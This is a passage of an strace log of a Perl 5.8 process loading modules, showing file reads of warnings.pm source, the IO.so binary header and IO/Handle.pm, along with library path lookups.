\"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
11808 20:20:26.776848 brk(0x81b6000)    = 0x81b6000
11808 20:20:26.776864 brk(0x81b5000)    = 0x81b5000
11808 20:20:26.776942 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
11808 20:20:26.777414 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
11808 20:20:26.778111 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
11808 20:20:26.778291 read(8, "", 4096) = 0
11808 20:20:26.778305 close(8)          = 0
11808 20:20:26.778453 _llseek(6, 412, [412], SEEK_SET) = 0
11808 20:20:26.778469 _llseek(6, 0, [412], SEEK_CUR) = 0
11808 20:20:26.778479 close(6)          = 0
11808 20:20:26.778519 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
11808 20:20:26.778543 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
11808 20:20:26.809993 futex(0xb7f98070, 0x81 /* FUTEX_??? */, 2147483647) = 0
11808 20:20:26.810048 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
11808 20:20:26.810082 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
11808 20:20:26.810192 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
11808 20:20:26.810220 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f9c000
11808 20:20:26.810234 mmap2(0xb7fa0000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7fa0000
11808 20:20:26.810249 close(6)          = 0
11808 20:20:26.810388 stat64("/etc/perl/IO/Handle.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:26.879626 stat64("/etc/perl/IO/Handle.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:26.879738 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:26.879791 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:26.879826 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:26.879853 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:26.879877 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:26.879892 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:26.879905 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:26.879917 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:26.879930 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:26.879944 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
11808 20:20:26.879967 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
11808 20:20:26.879984 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e7c8) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:26.879997 _llseek(6, 0, [0], SEEK_CUR) = 0
11808 20:20:26.880027 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
11808 20:20:26.880496 stat64("/etc/perl/Symbol.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.880513 stat64("/etc/perl/Symbol.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.880526 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.880538 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.880552 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.880564 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.880578 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.880593 stat64("/usr/lib/perl5/Symbol.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.880607 stat64("/usr/share/perl5/Symbol.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.880618 stat64("/usr/share/perl5/Symbol.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.880631 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.880643 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.880670 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.880709 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
11808 20:20:26.880747 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
11808 20:20:26.880761 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e318) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:26.880773 _llseek(8, 0, [0], SEEK_CUR) = 0
